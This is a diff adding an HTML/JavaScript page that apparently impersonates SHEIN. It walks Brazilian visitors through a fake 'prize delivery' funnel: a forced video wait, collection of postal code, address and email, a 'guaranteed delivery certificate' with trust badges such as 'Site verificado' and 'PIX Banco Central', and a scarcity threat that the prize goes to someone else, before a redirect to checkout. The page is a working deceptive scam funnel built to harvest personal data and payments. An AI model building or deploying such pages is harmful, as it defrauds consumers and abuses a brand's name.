@@ -1,0 +1,186 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<!-- UTMify UTM -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>SHEIN | Dados de Entrega</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/shein.css">
+<script src="js/shared.js"></script>
+<script src="js/mn4cyvnrgm.jsonp" async=""></script>
+<script src="js/E-v1.js" async=""></script>
+</head>
+<body>
+<div id="app-header"></div>
+<main id="app" style="transition:opacity .15s ease"></main>
+<div id="app-footer"></div>
+<script>
+(function(){
+  mountChrome(86);
+  var SM=StepManager('app');
+  function row(label,val){return '<div class="flex justify-between py-2 border-b border-gray-100 last:border-0"><span class="text-sm text-gray-400">'+label+'</span><span class="text-sm font-semibold text-gray-800 text-right">'+(escHtml(val)||'\u2014')+'</span></div>';}
+
+  /* ============ DELIVERY VIDEO ============ */
+  SM.add('video',function(){
+    setProgress(86);
+    return '<div class="step-enter wrap-md px-4 py-6">'
+      +'<div class="text-center mb-4"><span class="pill" style="background:#dcfce7;color:#15803d">\uD83D\uDCE6 ENTREGA</span><h2 class="text-2xl font-extrabold mt-3 mb-1">Como funciona a entrega</h2><p class="text-gray-500">Assista ao v\u00eddeo r\u00e1pido abaixo:</p></div>'
+      +'<div class="vsl-box shadow-lg">'
+        +'<div class="wistia_embed wistia_async_mn4cyvnrgm videoFoam=false" data-utmify-ignore="true" style="position:absolute;top:0;left:0;width:100%;height:100%"> </div>'
+      +'</div>'
+      +'<div class="mt-3 mb-6"><div class="h-1.5 w-full bg-gray-100 rounded-full overflow-hidden"><div id="vbar" class="h-full rounded-full" style="width:0%;background:#be185d;transition:width 1s linear"></div></div></div>'
+      +'<button id="v-cta" class="btn-primary w-full rounded-xl py-4 text-base opacity-40" disabled>Aguarde o v\u00eddeo...</button>'
+    +'</div>';
+  },function(){
+    var cta=document.getElementById('v-cta');
+    unlockVideoBtn({barId:'vbar',ctaId:'v-cta',seconds:70,label:'J\u00e1 assisti, continuar \u2192'});
+    cta.onclick=function(){if(!cta.disabled)SM.go('cep');};
+  });
+
+  /* ============ CEP ============ */
+  SM.add('cep',function(){
+    setProgress(88);
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<h2 class="text-2xl font-extrabold mb-2">Para onde enviamos?</h2>'
+      +'<p class="text-gray-500 mb-6">Digite seu CEP para preenchermos o endere\u00e7o.</p>'
+      +'<form id="f"><label class="text-xs font-bold uppercase tracking-wide text-gray-400 block mb-2">Seu CEP</label>'
+      +'<input id="inp" type="tel" inputmode="numeric" class="input-field text-center" placeholder="00000000" maxlength="8" enterkeyhint="go" style="font-size:20px;letter-spacing:4px" value="'+escHtml(LS.get('funil_cep'))+'">'
+      +'<p id="err" class="text-sm text-red-600 mt-2 hidden">CEP n\u00e3o encontrado. Verifique e tente novamente.</p>'
+      +'<button id="cta" type="submit" class="btn-primary w-full rounded-xl py-4 text-base mt-5">Buscar endere\u00e7o</button></form>'
+      +'<p class="text-xs text-gray-400 text-center mt-3">N\u00e3o sabe? <a href="https://buscacepinter.correios.com.br" target="_blank" class="underline">Buscar no Correios</a></p>'
+    +'</div>';
+  },function(){
+    var f=document.getElementById('f'),inp=document.getElementById('inp'),err=document.getElementById('err'),cta=document.getElementById('cta');
+    inp.focus();
+    f.onsubmit=function(e){e.preventDefault();err.classList.add('hidden');var cep=inp.value.replace(/\D/g,'');if(cep.length!==8){err.classList.remove('hidden');return;}
+      cta.disabled=true;cta.textContent='Buscando...';
+      fetch('https://viacep.com.br/ws/'+cep+'/json/').then(function(r){return r.json();}).then(function(d){
+        cta.disabled=false;cta.textContent='Buscar endere\u00e7o';
+        if(d.erro){err.classList.remove('hidden');return;}
+        LS.set('funil_cep',cep);LS.set('funil_estado',d.uf||'');LS.set('funil_cidade',d.localidade||'');LS.set('funil_rua',d.logradouro||'');LS.set('funil_bairro',d.bairro||'');
+        SM.go('addr');
+      }).catch(function(){cta.disabled=false;cta.textContent='Buscar endere\u00e7o';err.classList.remove('hidden');});
+    };
+  });
+
+  /* ============ ADDRESS CONFIRM ============ */
+  SM.add('addr',function(){
+    setProgress(90);
+    var cep=LS.get('funil_cep').replace(/^(\d{5})(\d{3})$/,'$1-$2');
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<h2 class="text-2xl font-extrabold mb-2">Confirme seu endere\u00e7o</h2>'
+      +'<p class="text-gray-500 mb-5">Est\u00e1 tudo certo com os dados abaixo?</p>'
+      +'<div class="bg-white border border-gray-100 rounded-2xl p-4 shadow-sm mb-5">'+row('CEP',cep)+row('Rua',LS.get('funil_rua'))+row('Bairro',LS.get('funil_bairro'))+row('Cidade',LS.get('funil_cidade'))+row('Estado',LS.get('funil_estado'))+'</div>'
+      +'<button id="yes" class="btn-primary w-full rounded-xl py-4 text-base mb-3">Sim, est\u00e1 correto</button>'
+      +'<button id="no" class="btn-outline w-full rounded-xl py-3 text-sm">Corrigir CEP</button>'
+    +'</div>';
+  },function(){
+    document.getElementById('yes').onclick=function(){SM.go('complement');};
+    document.getElementById('no').onclick=function(){SM.go('cep');};
+  });
+
+  /* ============ COMPLEMENT ============ */
+  SM.add('complement',function(){
+    setProgress(91);
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<h2 class="text-2xl font-extrabold mb-2">N\u00famero e complemento</h2>'
+      +'<p class="text-gray-500 mb-5">Para que a entrega chegue certinho at\u00e9 voc\u00ea.</p>'
+      +'<form id="f"><label class="text-xs font-bold uppercase tracking-wide text-gray-400 block mb-2">N\u00famero / Complemento</label>'
+      +'<input id="inp" type="text" class="input-field" placeholder="Ex.: 123, apto 45" value="'+escHtml(LS.get('funil_complemento'))+'">'
+      +'<button type="submit" class="btn-primary w-full rounded-xl py-4 text-base mt-5">Continuar</button></form>'
+    +'</div>';
+  },function(){
+    var f=document.getElementById('f'),inp=document.getElementById('inp');inp.focus();
+    f.onsubmit=function(e){e.preventDefault();LS.set('funil_complemento',inp.value.trim());SM.go('tracking');};
+  });
+
+  /* ============ TRACKING PREF ============ */
+  SM.add('tracking',function(){
+    setProgress(95);
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<h2 class="text-2xl font-extrabold mb-2">Como deseja acompanhar?</h2>'
+      +'<p class="text-gray-500 mb-6">Enviaremos o c\u00f3digo de rastreio da sua premia\u00e7\u00e3o por:</p>'
+      +'<div class="space-y-3">'
+        +'<button class="tp option-card w-full text-left border-2 border-gray-200 rounded-xl px-4 py-4 font-medium text-gray-700 flex items-center gap-3" data-v="email"><span class="text-2xl">\u2709\uFE0F</span><span>Por e-mail</span></button>'
+      +'</div>'
+    +'</div>';
+  },function(){
+    document.querySelectorAll('.tp').forEach(function(b){b.onclick=function(){LS.set('funil_tracking_pref','email');setTimeout(function(){SM.go('emailConfirm');},250);};});
+  });
+
+  /* ============ EMAIL CONFIRM ============ */
+  SM.add('emailConfirm',function(){
+    setProgress(96);
+    var em=LS.get('funil_email');
+    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
+      +'<div class="text-4xl mb-4">\u2709\uFE0F</div>'
+      +'<h2 class="text-2xl font-extrabold mb-2">Confirme seu e-mail</h2>'
+      +'<p class="text-gray-600 mb-2">Enviaremos o rastreio para:</p>'
+      +'<p class="font-bold text-lg mb-7">'+escHtml(em)+'</p>'
+      +'<button id="yes" class="btn-primary w-full rounded-xl py-4 text-base mb-3">Sim, est\u00e1 correto</button>'
+      +'<button id="no" class="btn-outline w-full rounded-xl py-3 text-sm">Corrigir e-mail</button>'
+    +'</div>';
+  },function(){
+    document.getElementById('yes').onclick=function(){showDeliveryTerms();};
+    document.getElementById('no').onclick=function(){SM.go('emailEdit');};
+  });
+  SM.add('emailEdit',function(){
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<h2 class="text-2xl font-extrabold mb-2">Digite seu e-mail</h2><p class="text-gray-500 mb-5">Para receber o rastreio da entrega.</p>'
+      +'<form id="f"><input id="inp" type="email" class="input-field" placeholder="seu@email.com" value="'+escHtml(LS.get('funil_email'))+'">'
+      +'<p id="err" class="text-sm text-red-600 mt-2 hidden">E-mail inv\u00e1lido.</p>'
+      +'<button type="submit" class="btn-primary w-full rounded-xl py-4 text-base mt-5">Continuar</button></form></div>';
+  },function(){
+    var f=document.getElementById('f'),inp=document.getElementById('inp'),err=document.getElementById('err');inp.focus();
+    f.onsubmit=function(e){e.preventDefault();var v=inp.value.trim();if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){err.classList.remove('hidden');return;}LS.set('funil_email',v.toLowerCase());showDeliveryTerms();};
+  });
+
+  /* ============ POPUP: TERMO DE ENTREGA GARANTIDA ============ */
+  function showDeliveryTerms(){
+    if(document.getElementById('dt-ov'))return;
+    var nome=escHtml((LS.get('funil_nome')||'').split(' ')[0]||'Participante');
+    var ov=document.createElement('div');ov.id='dt-ov';
+    ov.style.cssText='position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center;padding:16px;overflow-y:auto';
+    ov.innerHTML='<div style="background:#fff;border-radius:20px;max-width:400px;width:100%;overflow:hidden;box-shadow:0 24px 70px rgba(0,0,0,.45);margin:auto">'
+      +'<div style="background:#111;color:#fff;padding:16px 20px;text-align:center">'
+        +'<p style="font-size:11px;font-weight:800;letter-spacing:1px;text-transform:uppercase;opacity:.7;margin:0">Termo de recebimento</p>'
+        +'<h3 style="font-size:18px;font-weight:900;margin:4px 0 0">Certificado de Entrega Garantida</h3>'
+      +'</div>'
+      +'<div style="padding:20px 22px">'
+        +'<div style="border:2px dashed #16a34a;border-radius:14px;padding:14px;text-align:center;background:#f0fdf4;margin-bottom:14px">'
+          +'<div style="font-size:34px;line-height:1;margin-bottom:6px">\uD83D\uDCDC</div>'
+          +'<p style="font-size:13px;font-weight:800;color:#15803d;margin:0">ENTREGA 100% GARANTIDA</p>'
+          +'<p style="font-size:11.5px;color:#4b5563;margin:4px 0 0">Certificamos que a premia\u00e7\u00e3o reservada em nome de <b>'+nome+'</b> ser\u00e1 entregue no endere\u00e7o informado, com rastreio enviado por e-mail.</p>'
+        +'</div>'
+        +'<div style="display:flex;justify-content:center;gap:14px;margin-bottom:14px;font-size:10.5px;color:#6b7280;font-weight:700;flex-wrap:wrap">'
+          +'<span>\uD83D\uDD12 SSL 256-bits</span><span>\uD83C\uDFDB\uFE0F PIX Banco Central</span><span>\u2705 Site verificado</span>'
+        +'</div>'
+        +'<div style="background:#fffbeb;border:1px solid #fde68a;border-radius:12px;padding:12px 14px;margin-bottom:16px">'
+          +'<p style="font-size:12px;color:#92400e;line-height:1.6;margin:0">\u26A0\uFE0F <b>Aviso importante:</b> s\u00f3 avance se voc\u00ea tiver <b>certeza de que deseja receber a premia\u00e7\u00e3o</b>. Em caso de desist\u00eancia, o seu kit ser\u00e1 <b>entregue a outra participante</b> da fila de espera e n\u00e3o poder\u00e1 ser recuperado.</p>'
+        +'</div>'
+        +'<button id="dt-go" style="width:100%;background:#be185d;color:#fff;border:0;border-radius:14px;padding:15px;font-size:14px;font-weight:900;cursor:pointer">\u2705 Tenho certeza, quero receber \u2192</button>'
+        +'<button id="dt-back" style="width:100%;background:none;border:0;color:#9ca3af;font-size:12px;font-weight:700;padding:12px 0 2px;cursor:pointer;text-decoration:underline">Voltar</button>'
+      +'</div>'
+    +'</div>';
+    document.body.appendChild(ov);
+    document.getElementById('dt-go').onclick=function(){__funilNav('../checkout/index.html');};
+    document.getElementById('dt-back').onclick=function(){ov.remove();};
+  }
+
+  SM.go('video');
+})();
+</script>
+
+
+</body></html>
